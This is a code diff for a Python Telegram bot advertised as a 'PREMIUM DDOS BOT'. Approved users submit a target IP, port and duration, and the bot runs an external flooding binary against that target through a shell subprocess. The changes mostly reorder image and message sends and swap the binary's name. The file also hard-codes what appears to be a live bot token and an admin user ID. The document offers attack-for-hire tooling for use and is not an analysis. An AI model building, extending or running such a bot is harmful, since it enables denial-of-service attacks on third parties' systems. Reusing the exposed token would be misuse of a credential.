@@ -1,16 +1,15 @@
 import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
-import os
-from datetime import datetime, timedelta
+from datetime import datetime
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4")  # Fetch token from environment variable
+TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"  # Fetch token from environment variable
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
 CHANNEL_ID = "@fyyffgggvvvgvvcc"  # Replace with your channel username
 attack_in_progress = False
-last_attack_time = {}
+last_attack_time = {}  # Dictionary to track the last attack time for each user
 
 # Check if the token is set
 if not TELEGRAM_BOT_TOKEN:
@@ -49,6 +48,12 @@ async def is_member_of_channel(user_id: int, context: CallbackContext):
 async def start(update: Update, context: CallbackContext):
     """Send a welcome message to the user."""
     chat_id = update.effective_chat.id
+    welcome_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your welcome image URL
+
+    # Send image first
+    await context.bot.send_photo(chat_id=chat_id, photo=welcome_image_url)
+
+    # Send welcome text
     message = (
         "*WELCOME TO GODxCHEATS DDOS*\n\n"
         "*PREMIUM DDOS BOT*\n"
@@ -56,9 +61,7 @@ async def start(update: Update, context: CallbackContext):
         f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
         "Use /help to see available commands."
     )
-    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your actual image URL
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-    await context.bot.send_photo(chat_id=chat_id, photo=image_url)
 
 async def help_command(update: Update, context: CallbackContext):
     """Send a list of available commands and their usage."""
@@ -74,7 +77,6 @@ async def help_command(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-# Approve Command
 async def approve(update: Update, context: CallbackContext):
     """Approve a user or group ID to use the bot."""
     chat_id = update.effective_chat.id
@@ -88,7 +90,6 @@ async def approve(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
         return
 
-    # Extract the target ID
     target_id = args[0].strip()
 
     # Validate that the target ID is a number
@@ -171,13 +172,17 @@ async def attack(update: Update, context: CallbackContext):
 
     ip, port, time = args
     attack_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with actual image URL
+
+    # Send image first
+    await context.bot.send_photo(chat_id=chat_id, photo=attack_image_url)
+
+    # Then send the attack launch message
     await context.bot.send_message(chat_id=chat_id, text=(
         f"*✅ Attack Launched ✅*\n"
         f"*🎯 Target:* {ip}\n"
         f"*🔌 Port:* {port}\n"
         f"*⏱ Time:* {time} seconds\n"
     ), parse_mode='Markdown')
-    await context.bot.send_photo(chat_id=chat_id, photo=attack_image_url)
 
     # Update last attack time
     last_attack_time[user_id] = current_time
@@ -190,8 +195,9 @@ async def run_attack(chat_id, ip, port, time, context):
     attack_in_progress = True
 
     try:
+        # Simulate attack (Replace with real attack code)
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 500",
+            f"./pushparaj {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -207,9 +213,13 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        attack_finish_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with actual image URL
+
+        # Send finish image first
+        finish_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your finish image URL
+        await context.bot.send_photo(chat_id=chat_id, photo=finish_image_url)
+
+        # Send attack finished text
         await context.bot.send_message(chat_id=chat_id, text="*♥️ Attack Finished ♥️*", parse_mode='Markdown')
-        await context.bot.send_photo(chat_id=chat_id, photo=attack_finish_image_url)
 
 # Main Function
 def main():
